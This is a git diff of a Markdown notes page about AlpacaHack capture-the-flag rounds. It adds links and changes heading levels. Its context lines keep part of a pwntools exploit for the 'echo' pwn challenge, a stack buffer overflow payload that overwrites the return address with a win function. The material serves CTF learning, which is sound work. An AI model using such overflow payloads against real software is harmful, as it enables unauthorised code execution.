@@ -1,8 +1,11 @@
 # AlpacaHack
-- [AlpacaHack](https://alpacahack.com/)
+
+- https://alpacahack.com/
+- https://alpacahack.com/daily
 - [AlpacaHack Round 1 (Pwn)のWriteup - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2024/08/19/035647)
 
-# AlpacaHack Round 1 (Pwn) / echo
+## AlpacaHack Round 1 (Pwn) / echo
+
 [echo](https://alpacahack.com/ctfs/round-1/challenges/echo)
 
 **exploit1.py**
@@ -36,5 +39,7 @@ io.recvuntil(b"Data: ")
 io.sendline(b"A"*(0x100+24) + p64(win))
 io.interactive()
 ```
-# AlpacaHack Round 8 (Rev)
+
+## AlpacaHack Round 8 (Rev)
+
 - https://gist.github.com/akiym/7631528849a15ef1eb8ec36d4f590940
